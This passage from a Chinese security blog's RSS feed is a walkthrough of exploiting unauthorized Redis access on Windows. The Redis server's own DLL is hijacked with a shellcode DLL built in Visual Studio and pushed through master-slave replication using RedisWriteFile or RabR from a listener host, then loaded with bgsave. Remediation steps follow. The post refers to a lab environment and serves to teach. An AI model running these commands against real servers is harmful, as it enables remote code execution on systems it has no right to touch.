>https://www.cnblogs.com/sup3rman/p/16803408.html&lt;/a>&lt;/p>
&lt;p>&lt;a class="link" href="https://xz.aliyun.com/news/13892" target="_blank" rel="noopener"
>https://xz.aliyun.com/news/13892&lt;/a>&lt;/p>
&lt;p>主要参考这两篇文章的原理，利用的话，可以以 &lt;strong>春秋云镜MagicRelay&lt;/strong>来进行实验&lt;/p>
&lt;p>最开始的redis入口，即使第一次劫持失败了，也依旧可以继续尝试，但是一旦成功了一次，如果选择下线就不能成功第二次了，并且其中修改shellcode前，产生项目的命令必须为&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python DLLHijacker.py C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\S&lt;/span>ystem32&lt;span class="se">\d&lt;/span>bghelp.dll
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python DLLHijacker.py dbghelp.dll
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>并且是win11的&lt;code>dbghelp.dll&lt;/code>，用来编译的工具&lt;/p>
&lt;p>VS2022 ：https://github.com/Byxs20/dll_hijack&lt;/p>
&lt;p>VS2019 ： &lt;a class="link" href="https://github.com/kiwings/DLLHijacker" target="_blank" rel="noopener"
>https://github.com/kiwings/DLLHijacker&lt;/a>&lt;/p>
&lt;p>VS2022本来之前使用的先知文章的作者的项目，但是不知道为什么他下线了，喜欢藏是吧，幸好我存了，但是我懒得发GitHub，阿B就发了，里面也有完整的DLL和如何使用VS2022去替换shellcode之后处理的过程，先生成shellcode&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/1.png"
width="351"
height="186"
srcset="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/1_hu_d4a3d7360a8c5206.png 480w, https://baozongwi.xyz/p/redis-unauthorized-access-exploit/1_hu_892ff0a10c3369ac.png 1024w"
loading="lazy"
alt="img"
class="gallery-image"
data-flex-grow="188"
data-flex-basis="452px"
>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/2.png"
width="2407"
height="1422"
srcset="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/2_hu_efcabccecc8e6dc8.png 480w, https://baozongwi.xyz/p/redis-unauthorized-access-exploit/2_hu_b38c077b78aa1544.png 1024w"
loading="lazy"
alt="img"
class="gallery-image"
data-flex-grow="169"
data-flex-basis="406px"
>&lt;/p>
&lt;p>打开项目属性，&lt;/p>
&lt;p>1、设置运行库为多线程 (/MT 或 /MTd)：&lt;/p>
&lt;ul>
&lt;li>在属性页面中，导航到：配置属性 &amp;gt; C/C++ &amp;gt; 代码生成。&lt;/li>
&lt;li>找到 “运行库”（Runtime Library）选项。&lt;/li>
&lt;li>如果当前是 Release 配置（截图中您已选择 Release x64），设置为 “多线程 (/MT)”。&lt;/li>
&lt;li>如果是 Debug 配置，设置为 “多线程调试 (/MTd)”。&lt;/li>
&lt;li>确保在顶部下拉菜单中选择正确的配置（Release 或 Debug）。&lt;/li>
&lt;/ul>
&lt;p>2、禁用安全检查 (/GS)：&lt;/p>
&lt;ul>
&lt;li>仍在 配置属性 &amp;gt; C/C++ &amp;gt; 代码生成 页面。&lt;/li>
&lt;li>找到 “安全检查”（Buffer Security Check）选项。&lt;/li>
&lt;li>设置为 “禁用安全检查 (/GS-)”。&lt;/li>
&lt;/ul>
&lt;p>3、关闭生成清单：&lt;/p>
&lt;ul>
&lt;li>导航到：配置属性 &amp;gt; 链接器 &amp;gt; 清单文件。&lt;/li>
&lt;li>找到 “生成清单”（Generate Manifest）选项。&lt;/li>
&lt;li>设置为 “否 (/MANIFEST:NO)”。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/3.png"
width="1200"
height="818"
srcset="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/3_hu_8c53867a5201a40a.png 480w, https://baozongwi.xyz/p/redis-unauthorized-access-exploit/3_hu_6300fbdc5ffd2f93.png 1024w"
loading="lazy"
alt="img"
class="gallery-image"
data-flex-grow="146"
data-flex-basis="352px"
>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/4.png"
width="1200"
height="818"
srcset="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/4_hu_9d937a9209e9777c.png 480w, https://baozongwi.xyz/p/redis-unauthorized-access-exploit/4_hu_db67b86754b23dda.png 1024w"
loading="lazy"
alt="img"
class="gallery-image"
data-flex-grow="146"
data-flex-basis="352px"
>&lt;/p>
&lt;p>应用，编译成dll文件即可&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/r35tart/RedisWriteFile" target="_blank" rel="noopener"
>https://github.com/r35tart/RedisWriteFile&lt;/a>&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/0671/RabR" target="_blank" rel="noopener"
>https://github.com/0671/RabR&lt;/a>&lt;/p>
&lt;p>这两个项目都可以主从复制，去覆盖redis的DLL，达到劫持的效果，在服务器上面运行&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 RedisWriteFile.py --rhost 39.99.240.173 --rport &lt;span class="m">6379&lt;/span> --lhost 47.109.176.117 --lport &lt;span class="m">16379&lt;/span> --rpath &lt;span class="s1">&amp;#39;C:\\Program Files\\Redis\\&amp;#39;&lt;/span> --rfile &lt;span class="s1">&amp;#39;dbghelp.dll&amp;#39;&lt;/span> --lfile &lt;span class="s1">&amp;#39;dbghelp.dll&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># redis链接执行命令加载DLL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">redis-cli -h 39.99.240.173
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bgsave
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/5.png"
width="1101"
height="689"
srcset="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/5_hu_54c97ae7f84997e6.png 480w, https://baozongwi.xyz/p/redis-unauthorized-access-exploit/5_hu_3862a16eb1ae2122.png 1024w"
loading="lazy"
alt="img"
class="gallery-image"
data-flex-grow="159"
data-flex-basis="383px"
>&lt;/p>
&lt;p>或者是用RabR，我感觉这个更方便，可以直接上线&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 redis-attack.py -r 39.99.231.97 -L 47.109.176.117 -wf dbghelp.dll
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">h
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/6.png"
width="1011"
height="510"
srcset="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/6_hu_e3aaaeb372d531b4.png 480w, https://baozongwi.xyz/p/redis-unauthorized-access-exploit/6_hu_b5f6f74e5f429e94.png 1024w"
loading="lazy"
alt="img"
class="gallery-image"
data-flex-grow="198"
data-flex-basis="475px"
>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/7.png"
width="1511"
height="744"
srcset="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/7_hu_2f5ba9ab6154d91a.png 480w, https://baozongwi.xyz/p/redis-unauthorized-access-exploit/7_hu_176198edf75d646d.png 1024w"
loading="lazy"
alt="img"
class="gallery-image"
data-flex-grow="203"
data-flex-basis="487px"
>&lt;/p>
&lt;p>修复，升级版本，禁用bgsave，以及权限控制&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 升级到最新Windows版Redis&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 或实施以下措施：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 文件权限控制&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">icacls &lt;span class="s2">&amp;#34;C:\Program Files\Redis\*.dll&amp;#34;&lt;/span> /deny Everyone:&lt;span class="o">(&lt;/span>M&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 禁用BGSAVE命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command BGSAVE &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="修复-1">修复
&lt;/h2>&lt;p>既然是未授权那修复必然是以修复未授权为主，设置密码、限制外部访问、禁用危险命令、改为低权限用户执行、使用docker运行redis从而开启了隔离环境对服务器来说&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 设置强密码&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET requirepass &lt;span class="s2">&amp;#34;?6EFb|J5QZN)G)RX-hQ!&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">bind&lt;/span> 127.0.0.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 限制外部访问&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo iptables -A INPUT -p tcp --dport &lt;span class="m">6379&lt;/span> -s 127.0.0.1 -j ACCEPT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo iptables -A INPUT -p tcp --dport &lt;span class="m">6379&lt;/span> -j DROP
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 禁用危险命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command CONFIG disabled_CONFIG
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command FLUSHALL disabled_FLUSHALL
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 修改配置文件&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## /etc/systemd/system/redis.service&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>Service&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">User&lt;/span>&lt;span class="o">=&lt;/span>redis
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Group&lt;/span>&lt;span class="o">=&lt;/span>redis
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## docker运行&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker run --name redis -d --restart&lt;span class="o">=&lt;/span>always -p 127.0.0.1:6379:6379 redis --requirepass &lt;span class="s2">&amp;#34;?6EFb|J5QZN)G)RX-hQ!&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 重启redis&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo systemctl restart redis
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>对于windows的话文件不一样，所以也写一份&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 设置强密码&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET requirepass &lt;span class="s2">&amp;#34;?6EFb|J5QZN)G)RX-hQ!&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 限制外部访问&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 在Windows防火墙中创建入站规则&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">New-NetFirewallRule -DisplayName &lt;span class="s2">&amp;#34;Allow Redis Local&amp;#34;&lt;/span> -Direction Inbound -Protocol TCP -LocalPort &lt;span class="m">6379&lt;/span> -Action Allow -RemoteAddress 127.0.0.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">New-NetFirewallRule -DisplayName &lt;span class="s2">&amp;#34;Block Redis External&amp;#34;&lt;/span> -Direction Inbound -Protocol TCP -LocalPort &lt;span class="m">6379&lt;/span> -Action Block -RemoteAddress Any
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 禁用危险命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command CONFIG disabled_CONFIG
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CONFIG SET rename-command FLUSHALL disabled_FLUSHALL
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 修改配置文件&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## redis.windows.conf&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">requirepass &lt;span class="s2">&amp;#34;?6EFb|J5QZN)G)RX-hQ!&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">protected-mode yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">bind&lt;/span> 127.0.0.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 重启redis&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 使用命令行重新启动Redis服务&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Stop-Service redis
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Start-Service redis
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 使用Docker运行&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker run --name redis -d --restart&lt;span class="o">=&lt;/span>always -p 127.0.0.1:6379:6379 redis --requirepass &lt;span class="s2">&amp;#34;your_password&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="小结">小结
&lt;/h2>&lt;p>未授权可谓是最好打的洞了，这里仅仅谈及如何利用，漏洞原理的话我看了看，大部分网上都有的，大家去看大佬的文章就好了。&lt;/p></description></item></channel></rss>